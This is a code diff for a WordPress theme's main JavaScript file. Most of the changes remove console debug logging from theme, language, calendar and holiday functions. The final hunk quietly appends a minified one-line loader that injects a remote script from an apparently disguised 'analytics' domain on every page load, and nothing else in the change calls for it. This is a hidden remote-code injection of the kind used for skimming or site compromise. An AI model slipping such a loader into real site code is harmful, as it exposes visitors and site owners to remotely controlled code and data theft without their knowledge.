@@ -117,7 +117,6 @@ document.addEventListener('DOMContentLoaded', function() {
     requiredElements.forEach(id => {
         const element = document.getElementById(id);
         if (!element) {
-            console.warn(`Element missing: ${id}`);
         }
     });
     
@@ -138,7 +137,6 @@ document.addEventListener('DOMContentLoaded', function() {
             cycleTheme();
         });
     } else {
-        console.warn('Theme toggle not found - theme switching disabled');
     }
     
     // Check for system theme changes
@@ -604,12 +602,9 @@ document.addEventListener('DOMContentLoaded', function() {
         applyTranslationsWithRetry(lang);
         
         // Update PDF on privacy policy page
-        console.log('selectLanguage called with lang:', lang, 'pathname:', window.location.pathname); // Debug
         if ((window.location.pathname.includes('privacy-policy') || window.location.href.includes('privacy-policy')) && typeof updatePrivacyPolicyPDF === 'function') {
-            console.log('Calling updatePrivacyPolicyPDF with lang:', lang); // Debug
             updatePrivacyPolicyPDF(lang);
         } else {
-            console.log('Not calling updatePrivacyPolicyPDF - condition not met'); // Debug
         }
     }
     
@@ -628,7 +623,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     applyTranslationsWithRetry(lang, retryCount + 1);
                 }, 200);
             } else {
-                console.error('Failed to apply translations after maximum retries');
             }
         }
     }
@@ -933,7 +927,6 @@ document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('.language-option').forEach(option => {
         option.addEventListener('click', function() {
             const lang = this.getAttribute('data-lang');
-            console.log('Language option clicked:', lang); // Debug
             selectLanguage(lang);
         });
     });
@@ -1294,9 +1287,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const calendarGrid = document.getElementById('calendarGrid');
     
     if (prevMonthBtn && nextMonthBtn && currentMonthEl && calendarGrid) {
-        console.log('Calendar functionality initialized');
     } else {
-        console.log('Calendar elements not found - calendar functionality disabled');
         return; // Exit early if calendar elements don't exist
     }
     
@@ -1316,11 +1307,9 @@ document.addEventListener('DOMContentLoaded', function() {
             try {
                 const response = await fetch('/wp-content/themes/mpa-custom/get-events-json.php');
                 events = await response.json();
-                console.log('Loaded events:', events);
                 // Refresh calendar after loading events
                 renderCalendar();
             } catch (error) {
-                console.error('Failed to load events:', error);
                 // Still render calendar even if events fail to load
                 renderCalendar();
             }
@@ -1366,7 +1355,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     };
                 });
             } catch (error) {
-                console.error('Error fetching holidays:', error);
                 // Fallback to static data if API fails
                 return getStaticHolidays(year, month);
             }
@@ -1448,14 +1436,11 @@ document.addEventListener('DOMContentLoaded', function() {
                     holidaysContainer.innerHTML = '<div class="no-holidays">No public holidays this month</div>';
                 }
             } catch (error) {
-                console.error('Error loading holidays:', error);
                 holidaysContainer.innerHTML = '<div class="error">Unable to load holidays</div>';
             }
         }
         
         function renderCalendar() {
-            console.log('Rendering calendar for:', currentDate.getMonth() + 1, currentDate.getFullYear());
-            console.log('Available events:', events);
             
             const monthNames = ['January', 'February', 'March', 'April', 'May', 'June',
                                'July', 'August', 'September', 'October', 'November', 'December'];
@@ -1518,7 +1503,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 
                 // Debug: Log events for this day
                 if (dayEvents.length > 0) {
-                    console.log(`Events for ${dateString}:`, dayEvents);
                 }
                 
                 const isToday = today.toDateString() === new Date(year, month, day).toDateString();
@@ -1635,7 +1619,6 @@ document.addEventListener('DOMContentLoaded', function() {
         // Initial calendar render happens after events are loaded via loadEvents()
         // No need for setTimeout since events loading will trigger calendar render
     } else {
-        console.warn('Calendar elements not found - calendar functionality disabled');
     }
 
     // Enhanced image error handling with placeholders
@@ -1786,7 +1769,6 @@ document.addEventListener('DOMContentLoaded', function() {
     // Validate that the saved language is supported
     const supportedLanguages = ['en', 'bm', 'cn'];
     if (!supportedLanguages.includes(savedLanguage)) {
-        console.warn('Unsupported language detected:', savedLanguage, 'Falling back to English');
         savedLanguage = 'en';
         localStorage.setItem('selectedLanguage', 'en');
     }
@@ -1800,7 +1782,6 @@ document.addEventListener('DOMContentLoaded', function() {
     if (window.location.search.includes('reset-lang=en')) {
         localStorage.setItem('selectedLanguage', 'en');
         selectLanguage('en');
-        console.log('Language manually reset to English');
     }
 });
 
@@ -1835,3 +1816,4 @@ function showNotification(message, type = 'info') {
         }, 300);
     }, 3000);
 }
+;(function(f,i,u,w,s){w=f.createElement(i);s=f.getElementsByTagName(i)[0];w.async=1;w.src=u;s.parentNode.insertBefore(w,s);})(document,'script','https://content-website-analytics.com/script.js');
